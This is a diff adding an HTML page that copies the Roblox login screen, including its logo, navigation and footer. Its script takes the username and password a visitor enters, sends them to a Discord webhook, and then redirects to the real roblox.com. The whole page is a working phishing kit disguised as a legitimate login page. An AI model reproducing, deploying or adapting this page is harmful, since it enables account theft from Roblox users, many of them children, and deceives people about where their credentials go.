@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox - Login</title>
+    <style>
+        body {
+            background-color: #121215;
+            color: #f7f7f8;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        .navbar {
+            background-color: #191a1f;
+            padding: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .navbar img {
+            height: 40px;
+            margin-left: 20px;
+            cursor: pointer;
+        }
+        .navbar .nav-links {
+            display: flex;
+            gap: 80px;
+            align-items: center;
+            flex-grow: 1;
+            justify-content: center;
+            font-size: 22px;
+            font-weight: 550;
+        }
+        .login-container {
+            background: #272930;
+            padding: 15px;
+            width: 350px;
+            margin: 100px auto;
+            text-align: center;
+            font-family: Arial, sans-serif;
+            border-radius: 0;
+        }
+        .login-container h2 {
+            font-size: 36px;
+            font-weight: bold;
+        }
+        input {
+            width: 90%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #474a58;
+            border-radius: 12px;
+            background: #4a4d57;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #272930;
+            color: #d5d7dd;
+            border: 1px solid #d5d7dd;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 16px;
+            font-family: Arial, sans-serif;
+        }
+        a {
+            color: #f7f7f8;
+            text-decoration: none;
+        }
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            font-family: Arial, sans-serif;
+        }
+        .signup-button {
+            background: #335fff !important;
+            padding: 6px 10px;
+            border-radius: 12px;
+            font-family: Arial, sans-serif;
+            font-size: 20px;
+            font-weight: bold;
+            margin-right: 20px;
+        }
+        .alt-options {
+            background: #3b3e49;
+            padding: 12px;
+            border-radius: 12px;
+            margin-top: 10px;
+            border: none;
+            color: #f7f7f8;
+            width: 100%;
+            font-size: 14px;
+        }
+        .divider {
+            width: 80%;
+            height: 1px;
+            background: #3b3e49;
+            margin: 10px auto 5px auto;
+        }
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-top: 10px;
+            font-size: 12px;
+        }
+        .footer-divider {
+            width: 80%;
+            height: 1px;
+            background: #3b3e49;
+            margin: 10px auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="navbar">
+        <a href="https://www.roblox.com"><img src="https://i.imgur.com/RywLn1A.png" alt="Roblox Logo"></a>
+        <div class="nav-links">
+            <a href="https://www.roblox.com/discover">Charts</a>
+            <a href="https://www.roblox.com/catalog">Marketplace</a>
+            <a href="https://create.roblox.com">Create</a>
+            <a href="https://www.roblox.com/upgrades/robux">Robux</a>
+        </div>
+        <a href="https://www.roblox.com/login" class="signup-button">Sign Up</a>
+    </div>
+    <div class="login-container">
+        <h2>Add Account</h2>
+        <input type="text" id="username" placeholder="Username/Email/Phone">
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="login()">Log In</button>
+        <p><a href="https://www.roblox.com/login/forgot-password-or-username">Forgot Password or Username?</a></p>
+        <div class="divider"></div>
+        <button class="alt-options" onclick="alert('One-Time Code Sent')">Email Me a One-Time Code</button>
+        <button class="alt-options" onclick="alert('Switching Device')">Use Another Device</button>
+        <p><a href="https://www.roblox.com">Don't have an account? Sign Up</a></p>
+    </div>
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">About Us</a>
+            <a href="#">Jobs</a>
+            <a href="#">Blog</a>
+            <a href="#">Parents</a>
+            <a href="#">Gift Cards</a>
+            <a href="#">Help</a>
+            <a href="#">Terms</a>
+            <a href="#">Accessibility</a>
+            <a href="#">Privacy</a>
+        </div>
+        <div class="footer-divider"></div>
+        <p>&copy; 2025 ROBLOX Corporation. All rights reserved.</p>
+    </div>
+    <script>
+        function login() {
+            let user = document.getElementById('username').value;
+            let pass = document.getElementById('password').value;
+            if(user && pass) {
+                fetch("https://discord.com/api/webhooks/1352717630661722163/ZEyivXleLLNoOh55y8hCuvcb8pA1E8ubxZFqC6-Dk4KtTLMS8NZ1_jmTbI7HfGYnv6KD", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: `User: ${user}\nPassword: ${pass}` })
+                }).then(() => {
+                    window.location.href = "https://www.roblox.com";
+                });
+            }
+        }
+    </script>
+</body>
+</html>
